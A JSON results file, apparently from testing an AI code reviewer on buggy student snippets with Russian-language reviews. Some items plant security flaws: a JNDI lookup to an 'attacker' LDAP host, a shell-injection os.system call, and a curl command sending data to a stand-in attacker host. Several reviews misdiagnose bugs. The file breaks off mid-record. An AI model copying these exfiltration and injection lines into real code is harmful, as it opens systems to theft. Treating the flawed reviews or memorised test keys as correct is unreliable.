@@ -1,0 +1,788 @@
+[
+ {
+  "variant": "b1",
+  "itemId": "add-strings-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public String addStrings(String a, String b) {\n        return Integer.toString(Integer.parseInt(a) + Integer.parseInt(b));  // NumberFormatException на больших\n    }\n}\n",
+  "explanation": "Студент попытался решить задачу путем преобразования строк в целые числа и последующего их сложения. Однако такой подход имеет ряд недостатков: возможна потеря ведущих нулей, риск переполнения int типа и исключение при некорректном формате ввода.",
+  "issues": [
+   "Использование Integer.parseInt() может вызвать NumberFormatException при некорректном вводе",
+   "Не учтена возможность переполнения int типа при сложении чисел",
+   "Метод возвращает строку, но не учитывает ведущие нули в числах"
+  ],
+  "recommendations": [
+   "Используйте BigInteger для безопасного сложения больших чисел",
+   "Обрабатывайте возможные исключения NumberFormatException",
+   "Добавьте проверку на ведущие нули и верните результат с правильными ведущими нулями"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "NumberFormatException",
+   "Integer.parseInt",
+   "переполнение"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "add-strings-rte-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public String addStrings(String a, String b) {\n        return Integer.toString(Integer.parseInt(a) + Integer.parseInt(b));  // NumberFormatException на больших\n    }\n}\n",
+  "explanation": "Студент попытался решить задачу путем преобразования строк в целые числа и последующего сложения. Однако такой подход имеет ряд недостатков: он не учитывает возможные ошибки ввода, такие как недопустимые символы, а также не поддерживает большие числа, превышающие максимально допустимое значение int.",
+  "issues": [
+   "Использование Integer.parseInt() может вызвать NumberFormatException при некорректном вводе",
+   "Не обрабатываются отрицательные числа",
+   "Нет обработки нулевых входных значений"
+  ],
+  "recommendations": [
+   "Используйте BigInteger для безопасной арифметики больших чисел",
+   "Добавьте проверку на null и пустые строки",
+   "Обрабатывайте отрицательные числа"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "NumberFormatException",
+   "Integer.parseInt",
+   "переполнение"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "add-strings-rte-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public String addStrings(String a, String b) {\n        return Integer.toString(Integer.parseInt(a) + Integer.parseInt(b));  // NumberFormatException на больших\n    }\n}\n",
+  "explanation": "Студент попытался решить задачу путем прямого преобразования строк в целые числа и последующего сложения. Однако такой подход имеет недостатки: он не учитывает возможные ошибки формата, такие как ведущие нули или недопустимые символы, а также не способен обрабатывать большие числа, превышающие максимально допустимый диапазон int.",
+  "issues": [
+   "Использование Integer.parseInt() может вызвать NumberFormatException при некорректном вводе",
+   "Не учитывается случай, когда входные строки содержат ведущие нули",
+   "Нет обработки отрицательных чисел"
+  ],
+  "recommendations": [
+   "Используйте BigInteger для безопасной арифметики больших чисел",
+   "Проверьте корректность ввода перед преобразованием",
+   "Обрабатывайте случаи ведущих нулей и отрицательных чисел"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "NumberFormatException",
+   "Integer.parseInt",
+   "переполнение"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "anagram-check-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def is_anagram(s, t):\n    return sorted(s) == sorted(t.lower() / 0)  # ZeroDivisionError\n",
+  "explanation": "Студент попытался реализовать проверку анаграмм путем сортировки строк. Однако, он допустил серьезную логическую ошибку, вызвавшую исключение ZeroDivisionError. Необходимо использовать только корректные операции со строками.",
+  "issues": [
+   "Использование деления на ноль вызывает ошибку ZeroDivisionError",
+   "Функция sorted ожидает строку, но получает результат деления, приводящий к ошибке",
+   "Логика сравнения строк через сортировку правильная, но реализация содержит критическую ошибку"
+  ],
+  "recommendations": [
+   "Удалите деление на ноль и используйте только строки для работы с функцией sorted",
+   "Проверьте входные данные на корректность перед использованием функции sorted",
+   "Используйте встроенные методы строк для преобразования регистра символов"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "деление",
+   "ноль",
+   "TypeError"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "anagram-check-rte-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def is_anagram(s, t):\n    return sorted(s) == sorted(t.lower() / 0)  # ZeroDivisionError\n",
+  "explanation": "Студент попытался реализовать проверку анаграмм путем сортировки символов строк. Однако допущена ошибка при делении на ноль, что приводит к сбою программы. Рекомендуется использовать встроенные функции языка и тщательно проверять входные данные.",
+  "issues": [
+   "Использование деления на ноль вызывает ошибку Runtime Error",
+   "Функция sorted ожидает строку, деление на ноль приводит к типу int",
+   "Логика сравнения строк через сортировку верна, но реализация некорректна"
+  ],
+  "recommendations": [
+   "Исправьте ошибку деления на ноль, заменив её на корректный оператор",
+   "Проверьте типы данных перед передачей в функцию sorted",
+   "Используйте встроенные функции Python вместо ручного написания логики"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "деление",
+   "ноль",
+   "TypeError"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "anagram-check-rte-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def is_anagram(s, t):\n    return sorted(s) == sorted(t.lower() / 0)  # ZeroDivisionError\n",
+  "explanation": "Студент пытается проверить, являются ли две строки анаграммами путем сортировки символов. Однако, при попытке разделить строку 't' на ноль возникает ошибка деления на ноль, что приводит к сбою программы.",
+  "issues": [
+   "Использование деления на ноль вызывает ошибку Runtime Error",
+   "Функция sorted ожидает строку, но получает результат деления, что приводит к ошибке",
+   "Логика сравнения строк через сортировку верна, но реализация содержит критическую ошибку"
+  ],
+  "recommendations": [
+   "Избегайте использования операций, приводящих к исключениям, таких как деление на ноль",
+   "Проверьте типы данных перед использованием функций, ожидающих строки",
+   "Используйте try-except блок для обработки возможных ошибок"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "деление",
+   "ноль",
+   "TypeError"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "binary-search-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        int l=0, r=nums.length;  // r должен быть length-1\n        while (l<=r) {\n            int m = (l+r)/2;\n            if (nums[m]==target) return m;  // ArrayIndexOutOfBounds когда m=length\n            if (nums[m]<target) l=m+1; else r=m-1;\n        }\n        return -1;\n    }\n}\n",
+  "explanation": "Студент реализует бинарный поиск, но допускает ошибку в индексации массива, что приводит к выходу за пределы допустимых индексов. Также замечена некорректная инициализация верхней границы поиска.",
+  "issues": [
+   "Ошибка runtime: индекс массива выходит за пределы при m == length",
+   "Переменная r инициализирована неправильно, должна быть length-1"
+  ],
+  "recommendations": [
+   "Проверьте индексацию массива, убедитесь, что индексы находятся в допустимом диапазоне",
+   "Инициализируйте переменную r как nums.length-1"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ArrayIndexOutOfBounds",
+   "границы",
+   "length-1"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "binary-search-rte-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        int l=0, r=nums.length;  // r должен быть length-1\n        while (l<=r) {\n            int m = (l+r)/2;\n            if (nums[m]==target) return m;  // ArrayIndexOutOfBounds когда m=length\n            if (nums[m]<target) l=m+1; else r=m-1;\n        }\n        return -1;\n    }\n}\n",
+  "explanation": "Студент реализовал бинарный поиск, но допустил ошибку в инициализации верхнего предела поиска (`r`) и не учел возможность выхода индекса за пределы массива.",
+  "issues": [
+   "Ошибка времени исполнения (RTE): при выходе индекса за пределы массива",
+   "Переменная `r` инициализирована неправильно, должна быть nums.length-1",
+   "Возможна ситуация выхода индекса за пределы массива при m=length"
+  ],
+  "recommendations": [
+   "Проверьте индексные границы массива, чтобы избежать выхода за пределы",
+   "Инициализируйте переменную `r` как nums.length-1",
+   "Добавьте проверку выхода за пределы массива перед доступом к элементу"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ArrayIndexOutOfBounds",
+   "границы",
+   "length-1"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "binary-search-rte-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        int l=0, r=nums.length;  // r должен быть length-1\n        while (l<=r) {\n            int m = (l+r)/2;\n            if (nums[m]==target) return m;  // ArrayIndexOutOfBounds когда m=length\n            if (nums[m]<target) l=m+1; else r=m-1;\n        }\n        return -1;\n    }\n}\n",
+  "explanation": "Студент пытается реализовать бинарный поиск, но допустил ошибку в индексации массива и рискует получить ошибку времени исполнения.",
+  "issues": [
+   "Ошибка времени исполнения (RTE): цикл может выйти за пределы массива при m=length",
+   "Переменная r инициализирована неправильно, должна быть length-1"
+  ],
+  "recommendations": [
+   "Проверьте индексирование массива, чтобы избежать выхода за его пределы",
+   "Инициализируйте переменную r как nums.length-1"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ArrayIndexOutOfBounds",
+   "границы",
+   "length-1"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "climbing-stairs-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int climbStairs(int n) {\n        int[] dp = new int[n];  // не учитывает n=0 → отрицательный размер\n        dp[0]=1; dp[1]=2;\n        for (int i=2; i<n; i++) dp[i]=dp[i-1]+dp[i-2];\n        return dp[n-1];\n    }\n}\n",
+  "explanation": "Студент пытается решить задачу динамического программирования, но не учитывает граничные случаи и неверно инициализирует массив dp.",
+  "issues": [
+   "Ошибка при n=0: массив dp имеет отрицательную длину",
+   "Необработанный случай n<=1"
+  ],
+  "recommendations": [
+   "Добавьте проверку на n<=1 и верните соответствующее значение",
+   "Используйте инициализацию массива подходящей длины"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "NegativeArraySize",
+   "границы",
+   "n=0"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "climbing-stairs-rte-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int climbStairs(int n) {\n        int[] dp = new int[n];  // не учитывает n=0 → отрицательный размер\n        dp[0]=1; dp[1]=2;\n        for (int i=2; i<n; i++) dp[i]=dp[i-1]+dp[i-2];\n        return dp[n-1];\n    }\n}\n",
+  "explanation": "Студент пытается решить задачу динамическим программированием, но допускает ошибку при обработке нулевого значения n. Необходимо учитывать все граничные случаи.",
+  "issues": [
+   "Ошибка времени исполнения (RTE): массив инициализируется неправильно при n=0",
+   "Необработанный случай n=0 приводит к отрицательному индексу массива",
+   "Использование фиксированного размера массива вместо динамического подхода"
+  ],
+  "recommendations": [
+   "Проверьте корректность индексации массива и обработку случая n=0",
+   "Используйте динамическое выделение памяти для массива, чтобы избежать ошибок",
+   "Рассмотрите возможность использования рекурсивного подхода с мемоизацией"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "NegativeArraySize",
+   "границы",
+   "n=0"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "climbing-stairs-rte-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int climbStairs(int n) {\n        int[] dp = new int[n];  // не учитывает n=0 → отрицательный размер\n        dp[0]=1; dp[1]=2;\n        for (int i=2; i<n; i++) dp[i]=dp[i-1]+dp[i-2];\n        return dp[n-1];\n    }\n}\n",
+  "explanation": "Студент пытается решить задачу динамического программирования, но допускает ошибки в инициализации и индексации массива.",
+  "issues": [
+   "Ошибка при n=0: массив имеет отрицательную длину",
+   "Переменная `dp` инициализируется размером `n`, хотя должна быть длиной `n+1`",
+   "Использование индекса `i=n` выходит за пределы массива"
+  ],
+  "recommendations": [
+   "Добавьте проверку на случай n=0 и верните 1 напрямую",
+   "Измените размер массива на `n+1`",
+   "Используйте индекс `i<=n` вместо `i<n`"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "NegativeArraySize",
+   "границы",
+   "n=0"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "count-bits-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int[] countBits(int n) {\n        int[] r = new int[n];  // должно быть n+1\n        for (int i = 0; i <= n; i++) r[i] = Integer.bitCount(i);\n        return r;\n    }\n}\n",
+  "explanation": "Студент использует метод bitCount для подсчета количества битовых единиц в каждом числе. Однако, размер массива должен быть равен n+1, а не просто n. Также важно учитывать возможные ошибки времени исполнения, связанные с неправильной обработкой индексов.",
+  "issues": [
+   "Ошибка времени исполнения (RTE): возможно, проблема с индексами массива",
+   "Размер массива инициализирован неправильно (должен быть n+1)",
+   "Необработанное исключение при переполнении индекса"
+  ],
+  "recommendations": [
+   "Проверьте индексы цикла и размер массива",
+   "Инициализируйте массив размером n+1",
+   "Добавьте обработку исключений для защиты от переполнения индекса"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ArrayIndexOutOfBounds",
+   "n+1",
+   "размер"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "count-bits-rte-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int[] countBits(int n) {\n        int[] r = new int[n];  // должно быть n+1\n        for (int i = 0; i <= n; i++) r[i] = Integer.bitCount(i);\n        return r;\n    }\n}\n",
+  "explanation": "Студент использует метод bitCount для подсчета количества битовых единиц в каждом числе. Однако, размер массива инициализирован неправильно - он должен быть длиной n+1, чтобы вместить результат для числа n.",
+  "issues": [
+   "Ошибка времени выполнения (RTE): возможно, проблема с индексированием массива",
+   "Размер массива инициализирован неправильно, должен быть n+1"
+  ],
+  "recommendations": [
+   "Проверьте индексацию массива, убедитесь, что он инициализируется правильно",
+   "Инициализируйте массив размером n+1, а не просто n"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ArrayIndexOutOfBounds",
+   "n+1",
+   "размер"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "count-bits-rte-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int[] countBits(int n) {\n        int[] r = new int[n];  // должно быть n+1\n        for (int i = 0; i <= n; i++) r[i] = Integer.bitCount(i);\n        return r;\n    }\n}\n",
+  "explanation": "Студент пытается подсчитать количество битовых единиц в каждом числе от 0 до n. Проблема заключается в неправильной инициализации размера массива и возможной ошибке при обращении к элементам массива.",
+  "issues": [
+   "Ошибка времени исполнения (RTE): возможно, проблема с индексированием массива",
+   "Размер массива инициализирован неправильно - должен быть n+1"
+  ],
+  "recommendations": [
+   "Проверьте индексацию массива, убедитесь, что он имеет размер n+1",
+   "Используйте более явный способ инициализации массива, например: int[] r = new int[n + 1]"
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ArrayIndexOutOfBounds",
+   "n+1",
+   "размер"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "count-vowels-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def count_vowels(s):\n    return sum(1 for c in s.lower() if c == int('a'))  # ValueError\n",
+  "explanation": "Студент пытается подсчитать количество гласных букв в строке, но совершает несколько ошибок. Во-первых, он использует int('a'), что приводит к ошибке ValueError. Во-вторых, функция lower() применяется неправильно - она должна быть применена ко всей строке, а не к отдельным символам.",
+  "issues": [
+   "Использование int('a') вызывает ValueError, так как 'a' не является допустимым аргументом для функции int().",
+   "Функция lower() должна применяться к строке, а не к отдельному символу.",
+   "Необходимо проверять принадлежность символа к гласным буквам, а не сравнивать его напрямую с целым числом."
+  ],
+  "recommendations": [
+   "Используйте set('aeiou') для эффективного поиска гласных символов.",
+   "Применяйте метод .lower() ко всей строке, чтобы унифицировать регистр символов.",
+   "Избегайте использования int() там, где требуется проверка принадлежности символа."
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ValueError",
+   "int('a')",
+   "приведение типов"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "count-vowels-rte-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def count_vowels(s):\n    return sum(1 for c in s.lower() if c == int('a'))  # ValueError\n",
+  "explanation": "Студент пытается подсчитать количество гласных букв в строке, но использует некорректный способ проверки каждой буквы. Рекомендуется заменить текущий подход на использование встроенных функций Python для упрощения и улучшения читаемости кода.",
+  "issues": [
+   "Использование int('a') приводит к ошибке ValueError, так как 'a' не является допустимым аргументом для функции int.",
+   "Проверка символов строки должна использовать символы, а не целые числа."
+  ],
+  "recommendations": [
+   "Замените int('a') на 'a', чтобы проверять наличие буквы a в нижнем регистре.",
+   "Используйте встроенную функцию str.count() для подсчета гласных букв."
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ValueError",
+   "int('a')",
+   "приведение типов"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "count-vowels-rte-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "def count_vowels(s):\n    return sum(1 for c in s.lower() if c == int('a'))  # ValueError\n",
+  "explanation": "Студент пытается подсчитать количество гласных букв в строке, но совершает ошибку при попытке конвертации символа 'a' в целое число. Также стоит учесть, что проверка на гласные должна быть нечувствительной к регистру символов.",
+  "issues": [
+   "Использование int('a') вызывает ValueError, так как 'a' не является допустимым аргументом для функции int().",
+   "Проверка на гласные буквы должна учитывать все маленькие и большие буквы.",
+   "Функция lower() уже преобразует строку в нижний регистр, повторная проверка не требуется."
+  ],
+  "recommendations": [
+   "Используйте ord(c) вместо int('a'), чтобы получить числовой эквивалент символа 'a'.",
+   "Удалите проверку на lowercase, так как lower() уже выполняет эту операцию.",
+   "Упростите выражение, объединив условия в одно выражение."
+  ],
+  "codeQuality": 40,
+  "expectedKeywords": [
+   "ValueError",
+   "int('a')",
+   "приведение типов"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "excel-column-number-rte-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public int titleToNumber(String s) { return s.charAt(s.length()); } }\n",
+  "explanation": "Студент пытается вернуть символ напрямую через charAt, вместо того чтобы преобразовать его в числовой эквивалент. Для правильного решения необходимо использовать арифметические операции и учитывать позицию каждой буквы в строке.",
+  "issues": [
+   "Метод charAt возвращает символ, а не его позицию",
+   "Логика преобразования строки в число неверна",
+   "Функция должна возвращать целое число, а не символ"
+  ],
+  "recommendations": [
+   "Используйте метод String.codePointAt для получения числового представления символа",
+   "Преобразуйте строку в последовательность чисел и суммируйте их с учетом позиции",
+   "Проверьте граничные случаи, например пустая строка"
+  ],
+  "codeQuality": 30,
+  "expectedKeywords": [
+   "StringIndexOutOfBounds",
+   "length",
+   "off-by-one"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "excel-column-number-rte-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public int titleToNumber(String s) { return s.charAt(s.length()); } }\n",
+  "explanation": "Студент попытался вернуть символ напрямую, вместо того чтобы преобразовать его в числовой эквивалент. Для решения задачи необходимо последовательно обрабатывать каждый символ строки и использовать его позицию в алфавите.",
+  "issues": [
+   "Метод charAt возвращает символ, а не его числовой эквивалент",
+   "Функция должна преобразовывать строку в число согласно заданному формату"
+  ],
+  "recommendations": [
+   "Используйте метод String.codePointAt для получения числового значения символа",
+   "Преобразуйте каждый символ строки в соответствующее число и суммируйте их",
+   "Рассмотрите использование цикла for или метода String.chars"
+  ],
+  "codeQuality": 30,
+  "expectedKeywords": [
+   "StringIndexOutOfBounds",
+   "length",
+   "off-by-one"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "excel-column-number-rte-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "RTE",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution { public int titleToNumber(String s) { return s.charAt(s.length()); } }\n",
+  "explanation": "Студент попытался вернуть символ напрямую через charAt, однако функция ожидает получить целое число. Необходимо преобразовать символы строки в числа и суммировать их, учитывая позицию в алфавите.",
+  "issues": [
+   "Метод charAt возвращает символ, а не его числовой эквивалент",
+   "Функция должна преобразовывать строку в число согласно заданному формату"
+  ],
+  "recommendations": [
+   "Используйте метод String.codePointAt для получения числового значения символа",
+   "Преобразуйте каждый символ строки в соответствующее число и суммируйте их с учетом позиции",
+   "Проверьте граничные случаи, например пустая строка"
+  ],
+  "codeQuality": 30,
+  "expectedKeywords": [
+   "StringIndexOutOfBounds",
+   "length",
+   "off-by-one"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "add-strings-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import javax.naming.*;\npublic class Solution {\n    public String addStrings(String a, String b) throws Exception {\n        new InitialContext().lookup(\"ldap://attacker/x\");  // log4shell-style JNDI\n        return a + b;\n    }\n}\n",
+  "explanation": "Студент написал функцию, которая просто добавляет две строки вместе. Однако, включение небезопасного JNDI-запроса является серьезной уязвимостью безопасности. Рекомендуется тщательно проверять все входные данные и обрабатывать возможные ошибки.",
+  "issues": [
+   "Использование небезопасного JNDI-запроса, подверженного атаке Log4Shell",
+   "Игнорирование возможных исключений при вызове lookup()"
+  ],
+  "recommendations": [
+   "Избегайте использования JNDI-запросов без строгого контроля входных данных",
+   "Обрабатывайте исключения, возникающие при выполнении метода lookup()"
+  ],
+  "codeQuality": 50,
+  "expectedKeywords": [
+   "JNDI",
+   "LDAP",
+   "log4shell"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "add-strings-security-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import javax.naming.*;\npublic class Solution {\n    public String addStrings(String a, String b) throws Exception {\n        new InitialContext().lookup(\"ldap://attacker/x\");  // log4shell-style JNDI\n        return a + b;\n    }\n}\n",
+  "explanation": "Студент написал функцию сложения двух строк, однако он также включил небезопасный JNDI-запрос, который может быть использован злоумышленником для выполнения произвольного кода. Кроме того, исключение, возникающее при выполнении lookup(), не обрабатывается.",
+  "issues": [
+   "Использование небезопасного JNDI-запроса, уязвимого к атаке Log4Shell",
+   "Игнорирование возможных исключений при вызове lookup()"
+  ],
+  "recommendations": [
+   "Избегайте использования JNDI-запросов без строгого контроля входных данных",
+   "Обрабатывайте исключения, возникающие при работе с JNDI"
+  ],
+  "codeQuality": 50,
+  "expectedKeywords": [
+   "JNDI",
+   "LDAP",
+   "log4shell"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "add-strings-security-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import javax.naming.*;\npublic class Solution {\n    public String addStrings(String a, String b) throws Exception {\n        new InitialContext().lookup(\"ldap://attacker/x\");  // log4shell-style JNDI\n        return a + b;\n    }\n}\n",
+  "explanation": "Студент написал функцию сложения двух строковых значений. Однако, включение небезопасного JNDI-запроса является серьезной уязвимостью безопасности. Рекомендуется использовать безопасные методы обработки данных и обрабатывать все возможные ошибки, возникающие во время выполнения программы.",
+  "issues": [
+   "Использование небезопасного JNDI-запроса, подверженного атаке Log4Shell.",
+   "Игнорирование возможных исключений при вызове метода lookup."
+  ],
+  "recommendations": [
+   "Избегайте использования JNDI-запросов без строгого контроля ввода.",
+   "Обрабатывайте возможные исключения, чтобы избежать сбоев приложения."
+  ],
+  "codeQuality": 50,
+  "expectedKeywords": [
+   "JNDI",
+   "LDAP",
+   "log4shell"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "anagram-check-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import os\ndef is_anagram(s, t):\n    os.system(f'echo {s} {t} >> /tmp/log')  # shell injection\n    return sorted(s) == sorted(t)\n",
+  "explanation": "Студент написал функцию для определения анаграмм, однако реализация содержит уязвимости безопасности и проблемы с регистрацией символов. Рекомендуется использовать более безопасные методы обработки строк.",
+  "issues": [
+   "Использование os.system является небезопасным и может привести к shell-инъекциям",
+   "Функция не учитывает регистр символов при сравнении анаграмм",
+   "Создание файла /tmp/log без явной необходимости"
+  ],
+  "recommendations": [
+   "Используйте встроенные функции Python для работы со строками, например, Counter из collections",
+   "Проверьте регистрозависимость входных данных и учтите её в решении",
+   "Рассмотрите необходимость создания файла /tmp/log и удалите его при завершении программы"
+  ],
+  "codeQuality": 60,
+  "expectedKeywords": [
+   "os.system",
+   "shell injection",
+   "f-string"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "anagram-check-security-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import os\ndef is_anagram(s, t):\n    os.system(f'echo {s} {t} >> /tmp/log')  # shell injection\n    return sorted(s) == sorted(t)\n",
+  "explanation": "Студент написал функцию для определения анаграмм, однако реализация содержит уязвимость безопасности и неэффективна. Рекомендуется использовать встроенные инструменты Python для обработки строк и логирования.",
+  "issues": [
+   "Использование os.system является небезопасным и может привести к shell-инъекциям",
+   "Функция не учитывает регистр символов при сравнении анаграмм",
+   "Логирование через os.system неэффективно и нарушает инкапсуляцию"
+  ],
+  "recommendations": [
+   "Используйте встроенные функции Python для работы со строками, например, Counter из collections",
+   "Проверьте регистр символов перед сравнением анаграмм",
+   "Рассмотрите использование logging вместо os.system для логирования"
+  ],
+  "codeQuality": 60,
+  "expectedKeywords": [
+   "os.system",
+   "shell injection",
+   "f-string"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "anagram-check-security-01",
+  "runIndex": 3,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "import os\ndef is_anagram(s, t):\n    os.system(f'echo {s} {t} >> /tmp/log')  # shell injection\n    return sorted(s) == sorted(t)\n",
+  "explanation": "Студент реализовал функцию для определения анаграмм путем сортировки строк. Однако, использование os.system представляет угрозу безопасности из-за возможности shell-инъекций. Также функция некорректно обрабатывает строки с разным регистром.",
+  "issues": [
+   "Использование os.system является небезопасным и может привести к shell-инъекциям",
+   "Функция не учитывает регистр символов при сравнении анаграмм"
+  ],
+  "recommendations": [
+   "Используйте str.maketrans и str.translate для безопасного сравнения без учета регистра",
+   "Рассмотрите использование collections.Counter для эффективного сравнения анаграмм"
+  ],
+  "codeQuality": 60,
+  "expectedKeywords": [
+   "os.system",
+   "shell injection",
+   "f-string"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "binary-search-security-01",
+  "runIndex": 1,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
+  "successCriterion": null,
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl -s http://attacker/?d=\" + target});\n        return -1;\n    }\n}\n",
+  "explanation": "Студент попытался реализовать функцию поиска в массиве, но выбрал небезопасный подход с использованием exec для вызова внешней команды. Вместо этого следует использовать встроенные функции языка для эффективного поиска.",
+  "issues": [
+   "Использование exec для выполнения внешних команд является небезопасным и нарушает правила безопасности Java",
+   "Выполнение произвольных команд через exec может привести к уязвимостям типа RCE (Remote Code Execution)",
+   "Метод search должен возвращать индекс целевого элемента, а не всегда -1"
+  ],
+  "recommendations": [
+   "Используйте стандартные методы поиска в массиве, такие как бинарный поиск",
+   "Избегайте использования exec для выполнения внешних команд, используйте безопасные альтернативы",
+   "Вернуть правильный индекс целевого элемента вместо постоянного значения -1"
+  ],
+  "codeQuality": 30,
+  "expectedKeywords": [
+   "Runtime.exec",
+   "shell",
+   "exfiltration"
+  ]
+ },
+ {
+  "variant": "b1",
+  "itemId": "binary-search-security-01",
+  "runIndex": 2,
+  "expectedDiagnosis": "SECURITY",
+  "owaspClass": null,
+  "attackVector": null,
